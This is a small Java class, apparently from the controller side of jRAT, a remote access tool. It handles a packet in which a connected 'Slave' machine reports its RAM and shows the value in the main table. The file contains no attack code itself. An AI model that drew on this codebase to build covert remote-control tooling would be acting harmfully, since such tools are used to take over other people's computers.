package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;
import pro.jrat.ui.frames.Frame;
import pro.jrat.utils.Utils;


public class Packet63InitRAM extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		short ram = slave.readShort();
		slave.setRam(ram);
		
		int row = Utils.getRow(slave);
		
		Frame.mainModel.setValueAt(ram + " mb", row, 7);
	}

}
